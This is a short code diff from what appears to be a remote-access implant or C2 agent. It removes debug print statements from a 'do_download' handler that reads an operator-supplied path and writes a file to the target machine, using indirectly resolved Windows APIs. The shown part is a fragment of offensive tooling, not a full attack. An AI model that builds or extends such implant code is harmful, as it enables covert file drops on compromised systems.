@@ -79,7 +79,6 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 
 
 void commanders::do_download() {
-	printf("Hit Do_download()\n");
 	HANDLE hFie = NULL;
 	PCHAR Path = NULL;
 	PBYTE Buf = NULL;
@@ -89,14 +88,10 @@ void commanders::do_download() {
 
 	UINT taskID = g_ByteMgr->BeginTask();
 	UINT type = g_ByteMgr->Read4();
-	printf("type: %d\n", type);
 
 	if (type == UPLOAD_START_NON_CHUNKED || type == UPLOAD_START_CHUNKED) {
-		printf("hit upload_*\n");
 		PathLen = g_ByteMgr->Read4();
-		printf("PathLen: %d\n", PathLen);
 		Path = g_ByteMgr->ReadString(PathLen);
-		printf("Path: %s\n", Path);
 		hFie = hades->WinApis.CreateFileA(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFie == INVALID_HANDLE_VALUE) {
 			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
